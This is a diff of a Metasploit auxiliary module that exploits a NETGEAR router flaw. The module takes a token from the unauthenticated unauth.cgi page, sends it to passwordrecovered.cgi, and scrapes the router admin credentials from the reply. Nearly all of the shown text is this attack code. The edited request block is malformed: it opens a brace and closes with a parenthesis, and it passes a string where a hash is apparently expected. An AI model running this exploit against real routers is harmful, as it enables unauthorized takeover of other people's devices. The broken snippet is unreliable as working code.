@@ -60,7 +60,6 @@ class MetasploitModule < Msf::Auxiliary
     is_ng = check
 
     res = send_request_cgi({ 'uri' => uri })
-    
     if res.nil?
       print_error("#{rhost} returned an empty response.")
       return
@@ -76,7 +75,9 @@ class MetasploitModule < Msf::Auxiliary
       end
       print_status("Token found: #{token}")
       vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
-      r = send_request_cgi({'uri' => "/passwordrecovered.cgi?id=#{token}"})
+      r = send_request_cgi({
+        'uri' => "/passwordrecovered.cgi",
+        'vars_get' => "id=#{token}")
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
       if r.to_s.include?('left">')
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
@@ -98,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
   #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
   #This checks the response dor that header.
   def check                             #NOTE: this is working
-    res = send_request_raw({'uri'=>'/'})
+    res = send_request_cgi({'uri'=>'/'})
     unless res
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
